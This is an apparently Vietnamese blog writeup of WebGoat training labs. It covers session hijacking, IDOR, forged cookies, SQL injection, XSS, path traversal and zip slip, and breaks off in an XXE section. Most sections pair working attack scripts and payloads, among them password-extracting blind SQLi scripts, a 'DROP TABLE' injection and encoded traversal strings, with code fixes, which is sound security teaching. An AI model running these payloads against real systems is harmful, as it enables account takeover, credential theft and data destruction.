---
title: "Web Goat Writeup"
description: "Web Goat Writeup"
summary: "Web Goat Writeup"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2024-08-21
draft: false
authors:
  - shr3wd
---

## WebGoat

- Đây là writeup các lab trong [Webgoat](https://github.com/WebGoat/WebGoat)

# (A1)Broken Access Control

## **Hijack a session**

### Nguyên nhân

```java
// ...
private static final Supplier<String> GENERATE_SESSION_ID =
      () -> ++id + "-" + Instant.now().toEpochMilli();
// ...
if (StringUtils.isEmpty(authentication.getId())) {
    authentication.setId(GENERATE_SESSION_ID.get());
}
// ...
```

- Trang web xác thực người dùng thông qua cookie `hijack_cookie` , tuy nhiên cách khởi tạo cookie này rất dễ đoán và có thể bruteforce để có thể chiếm phiên truy cập của người dùng khác.
- Cụ thể: khi một người dùng đăng nhập vào trang web, một session id sẽ được tạo ra với format: `<id cuản người dùng cuối cùng đăng nhập + 1>-<thời gian lúc đăng nhập>`
- Để chiếm quyền của người dùng khác thì chỉ cần tìm được id của người dùng đó lúc đăng nhập, sau đó bruteforce thời gian để tạo ra được session id của người dùng đó.

### POC

- Đăng nhập lần đầu vào web

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled.png)

- Khi này, server sẽ response kèm với cookie `hijack_cookie=7455010367430442610-1722931194741`
- Gửi request này sang Repeater và gửi lại (đến khi ID tăng quá 1 đơn vị):

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%201.png)

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%202.png)

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%203.png)

- Lúc này Session ID đã tăng lên tận 2 đơn vị: `7455010367430442628 -> 7455010367430442630` . Có nghĩa người dùng khác đã đăng nhập và có ID là `7455010367430442629` , lúc này chỉ cần bruteforce thời gian nữa là sẽ có được cookie của người dùng đó (`1722931359634` tới `1722931360694`)
- Gửi request tới Intruder kèm cookie `hijack_cookie=7455010367430442629-17229313§59634§`  và tiến hành bruteforce giá trị

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%204.png)

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%205.png)

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%206.png)

Và tìm ra được session id của người dùng khác, hoàn thành lab

### Cách khắc phục

Thay cách tạo session id tăng tuần tự thành một cách tạo session id hoàn toàn ngẫu nhiên và khó đoán hơn 

```java
import java.security.SecureRandom;
// ...
private static final SecureRandom secureRandom = new SecureRandom();
private static final Supplier<String> GENERATE_SESSION_ID =
      () -> {
          byte[] randomBytes = new byte[32];
          secureRandom.nextBytes(randomBytes);
          return Base64.getUrlEncoder().encodeToString(randomBytes) + "-" + Instant.now().toEpochMilli();
      };
// ...
```

## **Insecure Direct Object References**

### **Nguyên nhân**

- Lập trình viên lập trình tính năng xem profile nhưng lại để cách xem dựa vào userid và không kiểm tra quyền (sai cách), đây là untrusted data, hacker có thể tận dụng điều này bằng cách thay đổi userid để xem được profile của người dùng khác

```java
String authUserId = (String) userSessionData.getValue("idor-authenticated-user-id");
      if (userId != null && !userId.equals(authUserId)) {
        // on the right track
        UserProfile requestedProfile = new UserProfile(userId);
        // secure code would ensure there was a horizontal access control check prior to dishing up
        // the requested profile
        if (requestedProfile.getUserId() != null
            && requestedProfile.getUserId().equals("2342388")) {
          return success(this)
              .feedback("idor.view.profile.success")
              .output(requestedProfile.profileToMap().toString())
              .build();
        } else {
          return failed(this).feedback("idor.view.profile.close1").build();
        }
      } else {
        return failed(this).feedback("idor.view.profile.close2").build();
      }
```

```java
String authUserId = (String) userSessionData.getValue("idor-authenticated-user-id");
    // this is where it starts ... accepting the user submitted ID and assuming it will be the same
    // as the logged in userId and not checking for proper authorization
    // Certain roles can sometimes edit others' profiles, but we shouldn't just assume that and let
    // everyone, right?
    // Except that this is a vulnerable app ... so we will
    UserProfile currentUserProfile = new UserProfile(userId);
    if (userSubmittedProfile.getUserId() != null
        && !userSubmittedProfile.getUserId().equals(authUserId)) {
        // ...
```

### **POC**

Ở phần 2 và 3, khi đăng nhập tài khoản **`tom:cat`** thì khi nhấn vào view profile để xem thông tin thì có một request được gửi đi `/profile` với response trả về như hình 

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%207.png)

Sử dụng url này kèm với userId: `…/profile/{userId}` thì có được một response như sau

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%208.png)

Feedback trả về nói là đã đúng đường dẫn nhưng cần thử một userId khác, lúc này chỉ cần viết một script nhỏ để bruteforce userId hợp lệ (hoặc dùng Intruder của Burp Suite)

```python
import requests

URL = "http://localhost:8080/WebGoat/IDOR/profile/"
headers = {  
    'Cookie': 'JSESSIONID={your session id}'
}  
id = 2342384
while True:
    r = requests.get(URL + str(id), headers=headers)
    json = r.json()
    lessonCompleted = json["lessonCompleted"]
    if lessonCompleted == True:
        print("[+] ID found: " + str(id))
        break
    else:
        id += 1
        print("[-] Trying ID: " + str(id))
```

```powershell
PS C:>Users/Admin/Desktop> python -u "d:\VNPT\projects\WebGoat\Payload\bruteforce-id.py"
[-] Trying ID: 2342385
[-] Trying ID: 2342386
[-] Trying ID: 2342387
[-] Trying ID: 2342388
[+] ID found: 2342388
```

Vậy userId cần hợp lệ là 2342388, truy cập đường dẫn [http://localhost:8080/WebGoat/IDOR/profile/2342388](../WebGoat%203dac4e1692924b5c97aa993738623e50.md)  sẽ pass được phần **View Another Profile** của lab này.

Tiếp theo đổi method thành PUT và Content-Type thành **`Content-Type: application/json`** và body:

```json
{"role":"1", "color":"red", "size":"large", "name":"Buffalo Bill", "userId":"2342388"}
```

Gửi request:

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%209.png)

### **Cách khắc phục**

Kiểm tra xem người dùng thực hiện yêu cầu có quyền hạn không, nếu là quản lý hoặc là người dùng sở hữu hợp lệ thì mới cho phép thực hiện request:

```java
// IDORViewOtherProfile
// ...
String authUserId = (String) userSessionData.getValue("idor-authenticated-user-id");
if (userId != null && userId.equals(authUserId)) {
    UserProfile requestedProfile = new UserProfile(userId);
    
    if (requestedProfile.getUserId() != null && userHasPermission(authUserId, requestedProfile)) {
        return success(this)
            .feedback("idor.view.profile.success")
            .output(requestedProfile.profileToMap().toString())
            .build();
    } else {
        return failed(this).feedback("idor.view.profile.unauthorized").build();
    }
} else {
    return failed(this).feedback("idor.view.profile.invalid").build();
}
// ...
private boolean userHasPermission(String authUserId, UserProfile requestedProfile) {

    return authUserId.equals(requestedProfile.getUserId());
}
// ...
```

```java
// IDOREditOtherProfile
// ...
 UserProfile currentUserProfile = new UserProfile(userId);
    if (userSubmittedProfile.getUserId() != null
        && userSubmittedProfile.getUserId().equals(authUserId) 
        && currentUserProfile.getUserId().equals(authUserId)) {
        // ...
```

## **Missing Function Level Access Control**

### Nguyên nhân lỗi

Lập trình viên để phía front-end các đoạn code, thông tin nhạy cảm, và đồng thời không xác thực quyền truy cập vào các đường dẫn nhạy cảm khiến cho hacker có thể truy cập và xem được các thông tin này.

```html
<li class="hidden-menu-item dropdown">
    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Admin<span class="caret"></span></a>
    <ul class="dropdown-menu" aria-labelledby="admin">
        <li><a href="/access-control/users">Users</a></li>
        <li><a href="/access-control/users-admin-fix">Users</a></li>
        <li><a href="/access-control/config">Config</a></li>
    </ul>
</li>
```

Người dùng có thể tạo tài khoản và đặt quyền admin của mình thoải mái → Người dùng có thể tạo tài khoản admin và sử dụng các tính năng của admin.

```java
@PostMapping(
      path = {"access-control/users", "access-control/users-admin-fix"},
      consumes = "application/json",
      produces = "application/json")
  @ResponseBody
  public User addUser(@RequestBody User newUser) {
    try {
      userRepository.save(newUser);
      return newUser;
    } catch (Exception ex) {
      log.error("Error creating new User", ex);
      return null;
    }

    // @RequestMapping(path = {"user/{username}","/"}, method = RequestMethod.DELETE, consumes =
    // "application/json", produces = "application/json")
    // TODO implement delete method with id param and authorization

  }
```

### POC

Từ đoạn mã html bị ẩn đi, thu thập thêm được 3 đường dẫn là `/access-control/users, /access-control/users-admin-fix, /access-control/config` 

Trong code thì chỉ có 2 đường dẫn /users và /users-admin-fix là hợp lệ, và hai đường dẫn này yêu cầu Content-Type là application/json 

```java
@GetMapping(
      path = {"access-control/users-admin-fix"},
      consumes = "application/json")
      // ...
```

```java
@GetMapping(
      path = {"access-control/users"},
      consumes = "application/json")
      // ...
```

Request đến 2 đường dẫn này (Bổ sung `Content-Type: application/json` vào header)

![Response từ đường dẫn `/users`]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%2010.png)

Response từ đường dẫn `/users`

![Response từ đường dẫn `/users-admin-fix` ]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%2011.png)

Response từ đường dẫn `/users-admin-fix` 

Response trả về từ đường dẫn `/users` trả về một json danh sách các user gồm 3 data fields: `username, admin, userHash` . → Dựa vào đây có thể tìm được mã hash của tài khoản Jerry là: `SVtOlaa+ER+w2eoIIVE5/77umvhcsh5V8UyDLUa1Itg=`

Còn response trả về từ /users-admin-fix thì trả về status code là 403 forbidden. Nguyên nhân là do trong logic code xử lý request, dev đã kiểm tra currentUser có phải là admin hay không thì mới cho sử dụng tính năng này.

Để lấy được mã hash mới của tài khoản Jerry, chúng ta có 2 cách: 

- Sử dụng đường dẫn /users hoặc /users-admin-fixed bằng phương thức POST để thêm một user mới với quyền admin.
- Phân tích cách tạo ra mã hash của chương trình và tạo lại mã này.

1. **Thêm một user mới với quyền admin**

```java
@PostMapping(
      path = {"access-control/users", "access-control/users-admin-fix"},
      consumes = "application/json",
      produces = "application/json")
  @ResponseBody
  public User addUser(@RequestBody User newUser) {
    try {
      userRepository.save(newUser);
      return newUser;
    } catch (Exception ex) {
      log.error("Error creating new User", ex);
      return null;
    }

    // @RequestMapping(path = {"user/{username}","/"}, method = RequestMethod.DELETE, consumes =
    // "application/json", produces = "application/json")
    // TODO implement delete method with id param and authorization

  }
```

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%2012.png)

Vậy là lúc này có thể đăng nhập tài khoản có quyền admin mới này, sau đó request đến `/users-admin-fixed` 

Tuy nhiên cách này ở đây không khả dụng vì không có tính năng đăng nhập để có thể sử dụng.

1. Tạo lại mã Hash
- Đầu tiên cần phải xem cách tạo mã Hash, dev code một hàm `DisplayUser(user, <SALT code>)` để hiển thị thông tin user với password đã bị hash với salt được truyền vào. Ở đây có hai salt được tìm thấy trong mã nguồn là

```java
public static final String PASSWORD_SALT_SIMPLE = "DeliberatelyInsecure1234";
public static final String PASSWORD_SALT_ADMIN = "DeliberatelyInsecure1235";
```

- Đoạn code của hàm `DisplayUser`

```java
@Getter
public class DisplayUser {
  // intended to provide a display version of WebGoatUser for admins to view user attributes

  private String username;
  private boolean admin;
  private String userHash;

  public DisplayUser(User user, String passwordSalt) {
    this.username = user.getUsername();
    this.admin = user.isAdmin();

    try {
      this.userHash = genUserHash(user.getUsername(), user.getPassword(), passwordSalt);
    } catch (Exception ex) {
      this.userHash = "Error generating user hash";
    }
  }

  protected String genUserHash(String username, String password, String passwordSalt)
      throws Exception {
    MessageDigest md = MessageDigest.getInstance("SHA-256");
    // salting is good, but static & too predictable ... short too for a salt
    String salted = password + passwordSalt + username;
    // md.update(salted.getBytes("UTF-8")); // Change this to "UTF-16" if needed
    byte[] hash = md.digest(salted.getBytes(StandardCharsets.UTF_8));
    return Base64.getEncoder().encodeToString(hash);
  }
}
```

- Ban đầu, dev sử dụng salt là `PASSWORD_SALT_SIMPLE` , nhưng đối với /users-admin-fixed thì sử dụng mã salt là `PASSWORD_SALT_ADMIN` . Trong mã nguồn, tìm thấy được password gốc của tài khoản Jerry là `doesnotreallymatter`

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%2013.png)

- Code lại hàm tạo này và chạy để lấy được mã hash mới của Jerry

```java
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Base64;

class HashJerry {
    public static void main(String[] args) throws Exception {
        String username = "Jerry";
        String password = "doesnotreallymatter";
        String PASSWORD_SALT_ADMIN = "DeliberatelyInsecure1235";

        String hash = genUserHash(username, password, PASSWORD_SALT_ADMIN);
        System.out.println(hash);
    }

    private static String genUserHash(String username, String password, String passwordSalt) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        String salted = password + passwordSalt + username;
        byte[] hash = md.digest(salted.getBytes(StandardCharsets.UTF_8));
        return Base64.getEncoder().encodeToString(hash);
    }
}
```

- Mã hash mới thu được là: `d4T2ahJN4fWP83s9JdLISio7Auh4mWhFT1Q38S6OewM=`

### Cách khắc phục

- Không để các thông tin nhạy cảm như đường dẫn của admin ở giao diện của người dùng thường.
- Kiểm tra quyền của người dùng hiện tại mới cho phép sử dụng các tính năng đặc biệt.

```java
@PostMapping(
      path = {"access-control/users", "access-control/users-admin-fix"},
      consumes = "application/json",
      produces = "application/json")
  @ResponseBody
  public User addUser(@RequestBody User newUser) {
    try {
      var currentUser = userRepository.findByUsername(webSession.getUserName());
      if (currentUser == null || !currentUser.isAdmin()) {
        return null;
      }
      
      
      userRepository.save(newUser);
      return newUser;
    } catch (Exception ex) {
      log.error("Error creating new User", ex);
      return null;
    }

    // @RequestMapping(path = {"user/{username}","/"}, method = RequestMethod.DELETE, consumes =
    // "application/json", produces = "application/json")
    // TODO implement delete method with id param and authorization

  }
```

## **Spoofing an Authentication Cookie**

### Nguyên nhân lỗi

- Thuật toán mã hóa và giải mã đơn giản, dễ dàng để có thể crack và tìm được thông điệp gốc ban đầu.
- Cụ thể, dev đơn giản tạo ra cookie mã dựa vào `username + SALT (được tạo ngẫu nhiên thành sâu có 10 ký tự)` → sau đó đảo ngược chuỗi này → chuyển thành mã hex → cuối cùng là mã hóa base64.
- Quá trình đảo ngược cũng tương tự.

```java
public static String encode(final String value) {
    if (value == null) {
      return null;
    }

    String encoded = value.toLowerCase() + SALT;
    encoded = revert(encoded);
    encoded = hexEncode(encoded);
    return base64Encode(encoded);
  }

  public static String decode(final String encodedValue) throws IllegalArgumentException {
    if (encodedValue == null) {
      return null;
    }

    String decoded = base64Decode(encodedValue);
    decoded = hexDecode(decoded);
    decoded = revert(decoded);
    return decoded.substring(0, decoded.length() - SALT.length());
  }
```

- Dựa vào điều này, hacker có thể tạo ra một cookie hợp lệ của một người dùng nào đó từ username của họ và truy cập trái phép phiên đăng nhập của người dùng đó.

### POC

- Để truy cập vào tài khoản Tom thì cần tạo ra một cookie của tài khoản này.
- Code lại logic mã hóa của chương trình trên, sau đó truyền username là Tom vào để tạo ra được cookie.

```java
import org.apache.commons.lang3.RandomStringUtils;
import org.springframework.security.crypto.codec.Hex;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

class SpoofCookie{
    private static final String SALT = RandomStringUtils.randomAlphabetic(10);
    
    public static void main(String[] args){
        String username = "tom";
        String cookie = encode(username);
        System.out.println(cookie);
    }

    public static String encode(final String value) {
        if (value == null) {
            return null;
        }

        String encoded = value.toLowerCase() + SALT;
        encoded = revert(encoded);
        encoded = hexEncode(encoded);
        return base64Encode(encoded);
    }

    private static String revert(final String value) {
        return new StringBuilder(value).reverse().toString();
    }

    private static String hexEncode(final String value) {
        char[] encoded = Hex.encode(value.getBytes(StandardCharsets.UTF_8));
        return new String(encoded);
    }

    private static String base64Encode(final String value) {
        return Base64.getEncoder().encodeToString(value.getBytes());
    }
}
```

- Chạy code trên và nhận được cookie `NGY0NDc5NmE1MjZlNTM3MDQ1NzM2ZDZmNzQ=` , gán cookie này sau đó Access thì sẽ có được truy cập bằng tài khoản Tom → pass được assign này.

### Cách khắc phục

- Thay cách mã hóa tự tạo này thành một phương thức mã hóa bảo mật hơn như Json Web Token.

# (A2) Cryptography Failures

# Lab 2

- Giải mã base64 của `c2hyM3dkOmFkbWlu` thì thu được tài khoản và password

![image.png]((A2)%20Cryptography%20Failures%2072bef8560ad34a86b98da2ac89261c09/image.png)

# Lab 3

- Sử dụng trang sau để decode https://strelitzia.net/wasXORdecoder/wasXORdecoder.html

![image.png]((A2)%20Cryptography%20Failures%2072bef8560ad34a86b98da2ac89261c09/image%201.png)

# Lab 4

- Sử dụng trang [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash) hoặc [https://crackstation.net/](https://crackstation.net/) để crack các mã hash này

![image.png]((A2)%20Cryptography%20Failures%2072bef8560ad34a86b98da2ac89261c09/image%202.png)

![image.png]((A2)%20Cryptography%20Failures%2072bef8560ad34a86b98da2ac89261c09/image%203.png)

# Lab 5

- Copy private key vào một file
- Sau đó dùng openssl

![image.png]((A2)%20Cryptography%20Failures%2072bef8560ad34a86b98da2ac89261c09/image%204.png)
[(A3) Injection]((A3)%20Injection.md)
# (A3) Injection

# SQL Injection (Intro)

## Lab 9

- Để lấy được tất cả dữ liệu trong bảng thì chỉ cần làm logic query thành một query luôn đúng

```sql
SELECT * FROM user_data WHERE first_name = 'John' AND last_name = ‘’ or ‘1’=’1’
```

### Lab 10

- Để lấy được tất cả dữ liệu trong bảng thì chỉ cần làm logic query thành một query luôn đúng

```sql
SELECT * FROM user_data WHERE login_count = 0 AND userid = 0 or 1 = 1
```

### Lab 11

- Payload

```sql
SELECT * FROM employees WHERE last_name = '' or 1=1 -- AND auth_tan = ''
```

### Lab 12

- Để bypass lab này thì cần phải update giá trị lương của Smith, lúc này phải sử dụng Query Chain để chèn câu lệnh update vào sau câu lệnh select
- Payload

```sql
Employee Name: <Anything>
Authentication TAN: '; UPDATE employees SET salary = 1000000 WHERE userid = '37648
```

### Lab 13

- Payload

```sql
Action contains: '; DROP TABLE access_log -- 
```

# SQL Injection **(advanced)**

## Lab 3

### Nguyên nhân lỗi

- Sử dụng untrust data nhập từ người dùng `accountName` để chèn chuỗi trực tiếp vào câu truy vấn SQL.

```java
public AttackResult injectableQuery(String accountName) {
    String query = "";
    try (Connection connection = dataSource.getConnection()) {
      boolean usedUnion = true;
      query = "SELECT * FROM user_data WHERE last_name = '" + accountName + "'";
```

### POC

- Đầu tiên sử dụng payload `' or '1'='1` để xem toàn bộ dữ liệu trong bảng `user_data`
- Sử dụng UNION để có thể xem được dữ liệu từ bảng user_system_data

```sql
' UNION SELECT userid as user_system_id, user_name, password, cookie, 'a','b',1 FROM user_system_data -- 
```

- Password của Dave là `passW0rD`

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image.png)

### Cách khắc phục

- Sử dụng PreparedStatement

## Lab 5

### Nguyên nhân lỗi

- Chèn trực tiếp giá trị vào câu query dẫn đến bị tấn công SQL Injection

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%201.png)

### POC

- Từ lỗ hổng SQL Injection này, có thể bruteforce để tìm ra từng ký tự trong mật khẩu của người dùng Tom

```python
from requests import post, put
import json  
URL = "http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge"

letters = [chr(i) for i in range(97, 123)]

numbers = [str(i) for i in range(10)]

letters += numbers

password = ""

while True:
    for char in letters:
        headers = {  
            'Cookie': 'JSESSIONID=50WEjJp0KpMHh8QPjanNPieKQi_ZGTnt66PK1FQP'
        }  
        payload = f"tom' AND password LIKE '{password + char}%' --"
        data = {
            "username_reg": payload,
            "email_reg": "a@a.com",
            "password_reg": "a",
            "confirm_password_reg": "a"
        }
        response = put(URL, data=data, headers=headers)
        if "already exists" in response.text:
            password += char
            print(password)
            break
    
```

- Chạy chương trình trên, và nó sẽ dò ra được password của tài khoản Tom

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%202.png)

- Password của Tom là `thisisasecretfortomonly` , đăng nhập với password này thì thành công.

### Cách khắc phục

- Sử dụng PreparedStatement thay vì Statement để thực hiện các truy vấn SQL với các tham số đầu vào được định dạng an toàn.

```java
  try (Connection connection = dataSource.getConnection()) {
        String checkUserQuery = "select userid from sql_challenge_users where userid = ?";
        PreparedStatement statement = connection.prepareStatement(checkUserQuery);
        statement.setString(1, username_reg);
        ResultSet resultSet = statement.executeQuery();
        if (resultSet.next()) {
          if (username_reg.contains("tom'")) {
            attackResult = success(this).feedback("user.exists").build();
          } else {
            attackResult = failed(this).feedback("user.exists").feedbackArgs(username_reg).build();
          }
        } else {
          PreparedStatement preparedStatement =
              connection.prepareStatement("INSERT INTO sql_challenge_users VALUES (?, ?, ?)");
          preparedStatement.setString(1, username_reg);
          preparedStatement.setString(2, email_reg);
          preparedStatement.setString(3, password_reg);
          preparedStatement.execute();
          attackResult = success(this).feedback("user.created").feedbackArgs(username_reg).build();
        }
  } catch (SQLException e) {
    attackResult = failed(this).output("Something went wrong").build();
  }
```

## SQL Injection (mitigation)

## Lab 9

### Nguyên nhân lỗi

- Lập trình viên chỉ đơn giản là validate input, nếu có white space thì trả failed về cho phía Client

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%203.png)

### POC

- Có thể sử dụng `/**/` để thay thế cho white space
- Payload

```sql
'/**/SELECT/**/*/**/FROM/**/user_system_data;/**/--
```

## Lab 10

### Nguyên nhân lỗi

- Vẫn sử dụng filter `white space` và kết hợp thêm filter đi 2 từ `SELECT` và `FROM`

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%204.png)

- Tuy nhiên, phần filter `SELECT` và `FROM` chỉ đơn giản là thay thế một lần và thay bằng một chuỗi rỗng `“”` → Nếu truyền `SSELECTELECT` thì khi filter thì nó sẽ trở thành SELECT, tương tự với `FROM` → Vẫn bị tấn công SQL Injection
- Về phần filter white space thì nó giống như Lab 9

### POC

- Sử dụng payload bên dưới để bypass

```sql
'/**/SESELECTLECT/**/*/**/FRFROMOM/**/user_system_data;/**/--
```

## Lab 12

- Sử dụng script python sau

```python
import requests  
  
index = 0  

headers = {  
    'Cookie': 'JSESSIONID=1JeQYvZuQvFhvbBcInM3sY6E0dKFHFK9m0Hg7RkA'  
}  

while True:  
    payload = '(CASE WHEN (SELECT ip FROM servers WHERE hostname=\'webgoat-prd\') LIKE \'{}.%\' THEN id ELSE hostname END)'.format(index)  

    r = requests.get('http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers?column=' + payload, headers=headers)  

    try:  
        response = r.json()
    except:  
        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
        break
    print(response)
    if response[0]['id'] == '1':  
        print('webgoat-prd IP: {}.130.219.202'.format(index))  
        break  
    else:  
        index += 1  
        if index > 255:  
            print("No IP found")  
            break  
```

- Chạy script trên và lấy được ip

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%205.png)

# **Cross Site Scripting**

## Lab 7

### Nguyên nhân lỗi

- Lập trình viên nhận input được nhập từ người dùng và chèn thẳng vào đoạn mã html để trả về cho phía Client mà không có một biện pháp ngăn chặn lỗ hổng XSS.

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%206.png)

### POC

- Như ở đoạn code trên, thì field1 chính là nơi dẫn đến lỗ hổng XSS.
- Chèn một đoạn script để active XSS ở phía Client như bên dưới

```jsx
<script>alert(1)</script>
```

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%207.png)

### Cách khắc phục

- Validate đầu vào dữ liệu để khó bị tấn công XSS hơn.

```jsx
if (XSS_PATTERN.test(field1) || XSS_PATTERN.test(field2)) {
    return failed(this).feedback("xss-reflected-5a-failed-wrong-field").build();
}
```

# **Cross Site Scripting (stored)**

### Nguyên nhân lỗi

- Tương tự như `Lab 7` của **Cross Site Scripting, nguyên nhân dẫn đến lỗi là dữ liệu từ người dùng không được filter mà được lưu trữ trực tiếp sau đó hiển thị trực tiếp ra → Khiến cho kẻ tấn công có thể chèn được payload XSS**

### POC

- Sử dụng payload sau để chạy được `*webgoat.customjs.phoneHome*`

```jsx
<script>webgoat.customjs.phoneHome()</script>
```

- Mở Dev Tool của browser lên thì sẽ thấy được kết quả của function `phoneHome`

# Path Traversal

## Lab 2

### Nguyên nhân lỗi

- Đầu vào dữ liệu từ phía Client được sử dụng trực tiếp để chèn vào trong việc tạo tên file, điều này khiến cho hacker có thể chèn payload vào `fullName` để thực hiện viẹc thay đổi đường dẫn lưu trữ file.

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%208.png)

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%209.png)

### POC

- Thực hiện việc upload file và bắt request này lại

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2010.png)

- Ở dữ liệu trả về đã hiển thị đường dẫn lưu trữ file. Và nhiệm vụ của chúng ta là ghi file vào đường dẫn `/home/webgoat/.webgoat-2023.8/PathTraversa`
- Lúc này chỉ cần thay đổi dữ liệu ở trường `fullName` thành `../test` rồi send request

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2011.png)

## Lab 3

### Nguyên nhân lỗi

- Nguyên nhân gây lỗi vẫn như lab trên, tuy nghiên chuỗi ký tự `../`  đã bị filter và thay thế thành chuỗi rỗng `“”`  → Tuy nhiên khi filter bằng cách này, attacker có thể chèn chuỗi `….//` để khi bị filter thì nó sẽ trở lại thành `../`

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2012.png)

### POC

- Thực hiện như các bước ở Lab 2
- Thay đổi giá trị trường `fullName` thành `….//test`

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2013.png)

## Lab 4

### Nguyên nhân lỗi

- Ở trong lab này, thay vì nguyên nhân gây lỗi đến từ `fullName` thì nó lại đến từ tên của file được upload. → Chỉ cần thay đổi tên file là có thể thực hiện tấn công path traversal

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2014.png)

### POC

- Tương tự như các bước ở lab trên.
- Thay đổi filename thành payload `../image.jpg`  và send request

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2015.png)

## Lab 5

### Nguyên nhân lỗi

- Lập trình viên tuy đã filter input từ phía Client các ký tự được sử dụng hay dùng để tấn công Path Traversal là `..`  và `/` . Tuy nhiên, bằng cách encode URL đi các ký tự này thì có thể bypass được cách filter này của lập trình viên.

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2016.png)

### POC

- Gửi một yêu cầu để lấy một ảnh Random thì phát hiện kết quả được trả về được lấy từ Location `/PathTraversal/random-picture?id=3.jpg`

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2017.png)

- Đây chính là nơi bị Path Traversal, thay đổi `id` thành `%2e%2e%2f` sau đó gửi request thì không bị filter nữa và hiển thị danh sách các file.

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2018.png)

- Với payload `%2e%2e%2f%2e%2e%2f` thì có thể tìm thấy được file cần tìm `path-traversal-secret.jpg`

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2019.png)

- Dùng payload `%2e%2e%2f%2e%2e%2fpath-traversal-secret` để đọc file này.

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2020.png)

## Lab 7

### Nguyên nhân lỗi

- Khi giải nén file thì không kiểm tra kỹ tên file, điều này khiến cho kẻ tấn công có thể thay đổi tên file nén → dẫn đến có thể kiểm soát được đường dẫn mà file giải nén được giải nén.

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2021.png)

### POC

- Tạo một đường dẫn muốn tấn công trên máy attack, ở đây là `/home/webgoat/.webgoat-2023.8/PathTraversal/shr3wd/shr3wd.jpg`

```bash
mkdir /home/webgoat/.webgoat-2023.8/PathTraversal/shr3wd
cd /home/webgoat/.webgoat-2023.8/PathTraversal/shr3wd
file shr3wd.jpg
```

- Sau đó nén file với đường dẫn này

```bash
zip evil.zip ../../../../../../../../home/webgoat/.webgoat-2023.8/PathTraversal/shr3wd/shr3wd.jpg
```

- Upload file `evil.zip`này lên để bypass được

### Cách khắc phục

```java
try {
    Path uploadedZipFile = tmpZipDirectory.resolve(file.getOriginalFilename());
    FileCopyUtils.copy(file.getBytes(), uploadedZipFile.toFile());

    try (ZipFile zip = new ZipFile(uploadedZipFile.toFile())) {
        Enumeration<? extends ZipEntry> entries = zip.entries();
        while (entries.hasMoreElements()) {
            ZipEntry e = entries.nextElement();

            Path resolvedPath = tmpZipDirectory.resolve(e.getName()).normalize();

            if (!resolvedPath.startsWith(tmpZipDirectory)) {
                throw new IOException("Zip entry is outside of the target directory: " + e.getName());
            }

            if (e.isDirectory()) {
                Files.createDirectories(resolvedPath);
            } else {
                Files.createDirectories(resolvedPath.getParent());

                try (InputStream is = zip.getInputStream(e)) {
                    Files.copy(is, resolvedPath, StandardCopyOption.REPLACE_EXISTING);
                }
            }
        }
    }

    return isSolved(currentImage, getProfilePictureAsBase64());
} catch (IOException e) {
    return failed(this).output("An error occurred during file processing.").build();
}

```

# (A5) XXE

# XXE 4

## Nguyên nhân lỗi

- Lập trình viên không kiểm tra đầu vào của xml
- Không tắt tính năng Document Type Definition (DTD), khiến cho kẻ tấn công có thể injection vào XML bằng cách chèn DTD.

```java
// ...
protected Comment parseXml(String xml) throws XMLStreamException, JAXBException {
    var jc = JAXBContext.newInstance(Comment.class);
